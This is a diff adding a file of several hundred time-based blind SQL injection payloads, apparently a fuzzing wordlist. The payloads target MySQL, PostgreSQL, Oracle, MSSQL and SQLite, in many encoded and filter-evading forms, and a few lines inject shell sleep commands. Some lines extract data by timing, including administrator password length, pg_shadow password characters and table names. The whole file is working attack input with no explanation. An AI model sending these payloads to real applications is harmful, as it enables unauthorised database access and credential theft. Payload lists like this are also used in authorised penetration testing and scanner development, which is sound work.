@@ -1,0 +1,288 @@
+0%22XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%2820%29%2C0%29%29XOR%22Z
+0%22XOR(if(now()%3Dsysdate()%2Csleep(20)%2C0))XOR%22Z
+0%2522XOR(if(now()%253Dsysdate()%252Csleep(20)%252C0))XOR%2522Z
+0'%257C(IF((now())LIKE(sysdate())%252CSLEEP(20)%252C0))%257C'Z%2520--
+0'%257C(IF((now())LIKE(sysdate())%252CSLEEP(20)%252C0))%257C'Z%2520%2523
+0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%2815%29%2C0%29%29XOR%27Z
+0'%7C(IF((now())LIKE(sysdate())%2CSLEEP(20)%2C0))%7C'Z%20--
+0'%7C(IF((now())LIKE(sysdate())%2CSLEEP(20)%2C0))%7C'Z%20%23
+0' AND SLEEP(15) AND 'WPrj' LIKE 'WPrj
+0'|(IF((now())LIKE(sysdate()),SLEEP(20),0))|'Z
+0'|(IF((now())LIKE(sysdate()),SLEEP(20),0))|'Z #
+0'|(IF((now())LIKE(sysdate()),SLEEP(20),0))|'Z --
+0'or(now()%253Dsysdate()%2526%2526SLEEP(20)or'Z
+0'or(now()%3Dsysdate()%26%26SLEEP(20)or'Z
+0'or(now()=sysdate()&&SLEEP(20)or'Z
+0' OR '1'='1' AND SLEEP(20) --
+0' OR IF(now()=sysdate(),sleep(20),0)#
+0' AND DBMS_LOCK.SLEEP(20) AND '1'='1
+0' AND pg_sleep(20) AND '1'='1
+0'; SELECT CASE WHEN (now()=current_timestamp) THEN pg_sleep(20) ELSE pg_sleep(0) END; --
+0' UNION ALL SELECT CASE WHEN datetime('now') = datetime('now') THEN (SELECT sleep(20)) ELSE 0 END; --
+0"XOR(if(now()=sysdate(),sleep(20),0))XOR"Z
+0'XOR(if(now()=sysdate(),sleep(20),0)) XOR'Z
+0'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z
+0'XOR(if(now()=sysdate(),sLeeP(20),0))XOR'Z
+0'XOR(if(now()=sysdate(),SLEEP(20),0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep(20),0))XOR’Z.php
+`0'XOR(if(now()=sysdate(),sleep(5*5),0))XOR'Z.php`
+0%22XOR(if(now()=sysdate(),sleep(20),0))XOR%22Z
+0" XOR(if(now()=sysdate(), sleep(20),0)) XOR"Z
+0"XOR(if(now()=sysdate(),sleep(20),0))XOR"/*Z*/
+0"\u0058OR(if(now()=sysdate(),sleep(20),0))\u0058OR"Z
+0%27XOR(if(now()=sysdate(),sleep(20),0))XOR%27Z
+"0\"XOR(if(now()=sysdate(),sleep(20),0))XOR\"Z"
+"XOR(if(length(database())<='30',sleep(20),null))OR"
+'xor(if(now()%253Dsysdate()%252Csleep(20)%252C0))or'
+'XOR(if(now()=sysdate(),SLEEP(20),0))XOR'Z
+(select*from(select(sleep(20)))a)
+'XOR(if(now()=sysdate(),sleep(20*1),0))OR'
+'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
+"XOR(if((substring((​ Select​ table_name ​ from​ information_schema.tables where​ table_schema=​database​() ​limit​ ​0,1),​1,1))=​'a'​, sleep​(20),​0))​ OR​ "*/
+'XOR(sleep(20))OR'
+1*$(sleep 5)`sleep 5``*/sleep(20)#'/*$(sleep 5)`sleep 5` #*/||sleep(20)||'"||sleep(20)||"`
+1`=`1` AND ELT(1337=1337,SLEEP(20)) AND `1`=`1 #
+1`=`1` AND ELT(1337=1337,SLEEP(20)) AND `1`=`1 --
+1%20AND%20(SELECT%201337%20FROM%20(SELECT(SLEEP(15)))YYYY)-1337
+1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(15)))YYYY)%20AND%20%27%%27=%27
+12345;SELECT CASE WHEN (1=1) THEN PG_SLEEP(15) ELSE PG_SLEEP(15) END;
+1'%257C%257Cpg_sleep(20)--
+1'%2b(select*from(select(sleep(20)))a)%2b'
+1 AND 1337=(SELECT 1337 FROM PG_SLEEP(15))
+1') AND 1337=(SELECT 1337 FROM PG_SLEEP(15)) AND ('1337'='1337
+1' AND 9520=(SELECT 9520 FROM PG_SLEEP(15)) AND ‘GRTs’=’GRTs
+1' AND 9520=(SELECT 9520 FROM PG_SLEEP(15)) AND ‘GRTs’=’GRTs”
+1 AND ELT(1337=1337,SLEEP(15))
+1 AND ELT(1337=1337,SLEEP(15))-- 1337
+1" and if(1=1,sleep(20),0) --
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(15)))YYYY) 1337 --
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(15)))YYYY) 1337 --+
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(15)))YYYY)
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(15)))YYYY) AND (1337=1337
+1 AND (SELECT * FROM (SELECT(SLEEP(15)))ZmTo) #
+1 AND (SELECT * FROM (SELECT(SLEEP(15)))ZmTo) --
+1 AND (SELECT * FROM (SELECT(SLEEP(15)))ZmTo) --+
+1+and+SLEEP(15)+--
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(20)+ELSE+pg_sleep(20)+END+FROM+users--
+'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(20)+ELSE+pg_sleep(20)+END+FROM+users--
+1)) and sleep(20) and (('1'='1
+1))) and sleep(20) and ((('1'='1
+1)))) and sleep(20) and (((('1'='1
+1'-IF(1=1,SLEEP(15),0) AND group_id='1
+[-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(15))A))]
+-1+or+1=((SELECT+1+FROM+(SELECT+SLEEP(15))A))
+1' or pg_sleep(20)
+1' + sleep(20)
+1' and sleep(20)
+1' && sleep(20)
+1' | sleep(20)
+1' || pg_sleep(20)
+1 or pg_sleep(20)--
+1' || pg_sleep(20)
+1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[20])
+1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([20]00000000/2))))
+1'||pg_sleep(20)--
+1 RLIKE SLEEP(15) #
+1 RLIKE SLEEP(15) --
+1'(SELECT%20(CASE%20WHEN%20(1=1)%20THEN%20SLEEP(15)%20ELSE%202%20END))
+1,(SELECT%20(CASE%20WHEN%20(1=1)%20THEN%20SLEEP(15)%20ELSE%202%20END))
+1; SELECT case when (SELECT current_setting('is_superuser'))='on' then pg_sleep(20) end;-- -
+1'(select*from(select sleep(20))a)--%20-
+1;SELECT IF((8303>8302),SLEEP(15),2356)#
+1;SELECT IF((8303>8302),SLEEP(15),2356)#--
+1; SELECT IF(SUBSTRING(@@version,1,1)='4',SLEEP(15),1); --
+1 SELECT pg_sleep(20);
+' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND IF(LENGTH(password)>10, SLEEP(20),0))--
+' ORDER BY IF(1=1, SLEEP(20), 1)--
+') UNION SELECT 1,2,3,4,5, SLEEP(20)--
+' OR SLEEP(15)--
+' AND IF(1=1, SLEEP(20),0)--
+' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 0,1),1,1)='A', SLEEP(5),0)--
+1; select pg_sleep(20);-- -
+1 SELECT SLEEP(15); #
+'1"; select sleep(20) --'
+1' && sleep(20)
+1' + sleep(20)
+1' | sleep(20)
+'1' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25, sleep(20) --'
+1'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z
+'%20%7C%7C%20pg_sleep(20)--
+'%20%7C%7C%20(select%20case%20when%20(1%3D1)%20then%20pg_sleep(20)%20else%20pg_sleep%20(-1)%20end)--
+'%20and%20(select%20*%20from%20(select(sleep(20)))a)--%20
+%20AND%20sleep(20)
+\"a'-IF(LENGHT(database())>9,SLEEP(15),0)or'1'='1\"
+' AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND '1337'='1337
+') AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND ('1337'='1337
+AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(2000000000/2)))) --
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+' AND 9520=(SELECT 9520 FROM PG_SLEEP(15)) AND ‘GRTs’=’GRTs”
+AND 9520=(SELECT 9520 FROM PG_SLEEP(15)) AND ‘GRTs’=’GRTs”
+" AND ELT(1337=1337,SLEEP(15))-- 1337
+" AND ELT(1337=1337,SLEEP(15)) AND "1337"="1337
+'AND(if(now()=sysdate(),sleep(20),1))OR"'
+' and if((select count(*) from pg_shadow where usename='postgres' and substring(password from 1 for 1)='$')=1,pg_sleep(20),0) --
+') AND (SELECT 1337 FROM (SELECT(SLEEP(15)))YYYY) AND ('PBiy'='PBiy
+'+AND+(SELECT+8839+FROM+(SELECT(SLEEP(15)))uzIY)+AND+'mSUA'%3d'mSUA
+‘ AND (SELECT 8839 FROM (SELECT(SLEEP(15)))uzIY) AND ‘mSUA’=’mSUA
+' AND (SELECT 8871 FROM (SELECT(SLEEP(15)))uZxz)
+AND (SELECT * FROM (SELECT(SLEEP(15)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(15)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(15)))nQIP)#
+AND (SELECT * FROM (SELECT(SLEEP(15)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(15)))YjoC) AND '%'='
++and+SLEEP(15)+--
+") AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(15))-- 1337
+")) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(15))-- 1337
+')) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(15))-- 1337
+desc%2c(select*from(select(sleep(20)))a)
+desc2c(select from(select(sleep(20)))a) -1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(15))A))
+gilt' AND (SELECT -9789) OR 6323=6323# FROM (SELECT(SLEEP(15)))Xeps) AND 'HlBp'='HlBp
+ibrahim'(select*from(select(sleep(20)))a)'
+ibro'%257C%257Cpg_sleep(20)--
+ibro'%7C%7Cpg_sleep(20)--
+ibro'||pg_sleep(20)--
+ibro'SELECT%252525252BCASE%252525252BWHEN%252525252B(1%252525253D1)%252525252BTHEN%252525252Bpg_sleep(20)%252525252BEND%2525252520--
+ibro' || (select case when (1=1) then pg_sleep(20) else pg_sleep (-1) end)--
+ibro'SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(20)+END --
+ibro'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z
+id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1
+id=2 AND (select sleep(20)
+if(1=1,sleep(20),0)/*'XOR(if(1=1,sleep(20),0))OR'"XOR(if(1=1,sleep(20),0))OR"*/
+IF (1=1) THEN dbms_lock.sleep(20); ELSE dbms_lock.sleep(20); END IF; END;
+-IF(MID(VERSION(),1,1) = '3', SLEEP(15), 0) --
+if(now()=sysdate(),sleep(20),0)/*\'XOR(if(now()=sysdate(),sleep(20),0))OR\'\"XOR(if(now()=sysdate(),sleep(20),0))OR\"*/
+if(now()=sysdate(),sleep(20),0)/'XOR(if(now()=sysdate(),sleep(20),0))OR'"XOR(if(now()=sysdate(),sleep(20),0) and 15=15)"/
+if(now()=sysdate(),sleep(20),0)
+offset=1;SELECT IF((8303>8302),SLEEP(15),2356)#
+ORDER BY SLEEP(15)--
+" or IF(1=1,SLEEP(15),0)#
+' or IF(1=1,SLEEP(15),0)#
+" or if(ascii(substring((select database()),1,1))=97,sleep(20),false) or "
+' or if(length(database())>0,sleep(20),false) or '
+'OR(if(now()=sysdate(),sleep(20),0))OR(if(1=1,sleep(20),0))OR"'
+'OR(select 'abcD' from DUAL where 1=1 and SLEEP(15))OR'
+' or (select sleep(20) from dual where ascii(substr((select database()),1,1))=97) or '
+" or sleep(20)#
+" or sleep(20)="
+") or sleep(20)="
+")) or sleep(20)="
+" OR SLEEP(15)#
+orwa' AND (SELECT 6377 FROM (SELECT(SLEEP(15)))hLTl)--
+O'XOR(if(now()-sysdate(), sleep(20),0))XOR'Z 0'XOR(if(now() sysdate(), sleep(5+1),0))XOR'Z
+page=0'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z
+'||pg_sleep(20)--
+pg_sleep(20)--
+' || pg_sleep(20)--
+pg_sleep(20)
+" RLIKE SLEEP(15)-- 1337
+" RLIKE SLEEP(15) AND "1337"="1337
+") RLIKE SLEEP(15) AND ("1337"="1337
+")) RLIKE SLEEP(15) AND (("1337"="1337
+rrr%27%3BSELECT%20PG_SLEEP%285%29--
+rrr'%3BSELECT%20PG_SLEEP(15)--
+rrr';SELECT PG_SLEEP(15)--
+(select(0)from(select(sleep(20)))v)
+(select(0)from(select(sleep(20)))v)+'"
+(select(0)from(select(sleep(20)))v)+'"+
+(select(0)from(select(sleep(20)))v)/**+
+(select(0)from(select(sleep(20)))v)%2f*'+(select(0)from(select(sleep(20)))v)+'"+(select(0)from(select(sleep(20)))v)+"*%2f
+(select(0)from(select(sleep(20)))v)+'"+ (select(0)from(select(sleep(20)))v)+"#$%2f
+(select(0)from(select(sleep(20)))v)/*'+(select(0)from(select(sleep(20)))v)+'"+(select(0)from(select(sleep(20)))v)+"*/
+(select(0)from(select(sleep(20)))v) (SELECT SLEEP(15))
+'"+(select(0)from(select(sleep(20)))v)+"
+%27%22%2B%28select%280%29from%28select%28sleep%286%29%29%29v%29%2B%22
+||(SELECT 0x20720206971 FROM DUAL WHERE 1337=1337 AND ELT(1337=1337,SLEEP(15)))|| #
+'+(select*from(select(if(1=1,sleep(20),false)))a)+'
+,(select * from (select(sleep(20)))a)
+(SELECT*FROM(SELECT(SLEEP(15)))a)
+(select*from(select sleep(20))a)--%20--
+');SELECT IF(RAND()>0.8,SLEEP(15),0)#
+SELECT pg_sleep(20)
+";SELECT pg_sleep(20);
+' SELECT pg_sleep(20);
+(SELECT pg_sleep(20))
+;SELECT pg_sleep(20);
+'SLEEP(15)--
++ SLEEP(15) + '
+--sleep(20)
+SLEEP(15)/*' or SLEEP(15) or '" or SLEEP(15) or "*/
+SLEEP(15)  ' #
+SLEEP(15)  ' --
+SLEEP(15)=" --+
+SLEEP(15)=' #
+";sleep 15
+";sleep 15--
+";sleep(20)
+";sleep(20)--
+(sleep 15)
+(sleep 15)--
+(sleep(20))
+(sleep(20))--
+-sleep(20)
+;sleep 15
+;sleep 15--
+test%40gmail.com%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%285*1%29%2C0%29%29XOR%27Z
+["test@gmail.com' OR SLEEP(15)#"]
+test@gmail.com'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
+"test');SELECT PG_SLEEP(15)--"}}
+test');SELECT PG_SLEEP(15)--
+UNION SELECT CASE WHEN (SELECT 1 FROM DUAL WHERE LENGTH((SELECT username FROM all_users WHERE ROWNUM=1))=1) THEN dbms_lock.sleep(20) ELSE 1 END FROM DUAL--
+" UNION SELECT CASE WHEN (SELECT pg_sleep(20)) THEN NULL ELSE NULL END;--
+' UNION SELECT CASE WHEN (SELECT pg_sleep(20)) THEN NULL ELSE NULL END;--
+" union select null, sleep(20), null union "
+' union select null, sleep(20), null union '
+" UNION SELECT pg_sleep(20)--
+' UNION SELECT pg_sleep(20)--
+UNION SELECT @@VERSION,SLEEP(15),3
+" WHERE 1337=1337 AND ELT(1337=1337,SLEEP(15))-- 1337
+") WHERE 1337=1337 AND ELT(1337=1337,SLEEP(15))-- 1337
+' WHERE 1337=1337 AND ELT(1337=1337,SLEEP(15))-- 1337
+` WHERE 1337=1337 AND ELT(1337=1337,SLEEP(15))-- 1337
+") WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(15)))YYYY)-- 1337
+" WHERE 1337=1337 RLIKE SLEEP(15)-- 1337
+x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(20)+ELSE+pg_sleep(20)+END--
+if(now()%3dsysdate()%2csleep(20)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(20)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(20)%2c0))OR%22*/
+%00 or sleep(20) --
+%00';select pg_sleep(20) --
+%00';select sleep(20) --
+%0d%0a\';select pg_sleep(20) --
+%0d%0a\';select sleep(20) --
+%0d%0a\\' and 1337=(select 1337 from (select sleep(20))A) --
+%0d%0a\\' and 1337=(select 1337 from pg_sleep(20)) --
+' and 1337=(select 1337 from (select sleep(20))A) --
+' and 1337=(select 1337 from pg_sleep(20)) --
+' and sleep(20) --
+' or 1337=(select 1337 from (select sleep(20))A) --
+0x00 and 1337=(select 1337 from (select sleep(20))A) --
+0x00 and 1337=(select 1337 from pg_sleep(20))
+0x00 and 1337=(select 1337 from pg_sleep(20)) --
+;select pg_sleep(20)
+;select pg_sleep(20) --
+\' and 1337=(select 1337 from (select sleep(20))A) --
+\' and 1337=(select 1337 from pg_sleep(20)) --
+\\';select pg_sleep(20) --
+\\';select sleep(20) --
+\\n and 1337=(select 1337 from (select sleep(20))A)
+\\n and 1337=(select 1337 from (select sleep(20))A) --
+\\n and 1337=(select 1337 from pg_sleep(20))
+\\r\\n and 1337=(select 1337 from (select sleep(20))A) --
+\\r\\n and 1337=(select 1337 from pg_sleep(20))
+\\r\\n and 1337=(select 1337 from pg_sleep(20)) --
+\\r\\n and sleep(20)
+\\r\\n and sleep(20) --
+1' AnD SLEEP(15)--
+(SELECT+1+FROM+pg_sleep((ASCII((SELECT+datnam+FROM+pg_database+LIMIT+1))+-+32)+/+2))
+orwa') OR 11=(SELECT 11 FROM PG_SLEEP(15))--
+-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(15))A))
+\r\n' or 1337=(select 1337 from pg_sleep(20)) --
+SELECT CASE WHEN (1=1) THEN pg_sleep(20) ELSE pg_sleep(20) END--
+1'=sleep(20)='1
+'%2b(select*from(select(sleep(20)))a)%2b'
+OR SLEEP(15)
+AND SLEEP(15) AND ('kleiton'='kleiton
+IF 1=1 THEN dbms_lock.sleep(20);
+SLEEP(15)
+pg_sleep(25)
+and if((select SUBSTRING(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='a', sleep(20), null)--
+0'or(now()%253Dsysdate()%2526%2526SLEEP(15))or'Zif(now()%253Dsysdate()%252Csleep(20)%252C0)%252F%2522XOR(if(now()%253Dsysdate()%252Csleep(20)%252C0))OR%2522%252Fif(now()%253Dsysdate()%252Csleep(20)%252C0)'XOR(if(now()%253Dsysdate()%252Csleep(20)%252C0))OR'%2522XOR(if(now()%253Dsysdate()%252Csleep(20)%252C0))OR%2522*%252Fif(now()%253Dsysdate()%252Csleep(20)%252C0)%252F'XOR(if(now()%253Dsysdate()%252Csleep(20)%252C0))OR'%2522XOR(if(now()%253Dsysdate()%252Csleep(20)%252C0)%2520and%252020%253D20)%2522%252FSLEEP(15)'%2520or%2520SLEEP(15)%2520or%2520'%2522%2520or%2520SLEEP(15)%2520or%2520%2522*%252F%25252c(select%252520*%252520from%252520(select(sleep(20)))a)%2520--
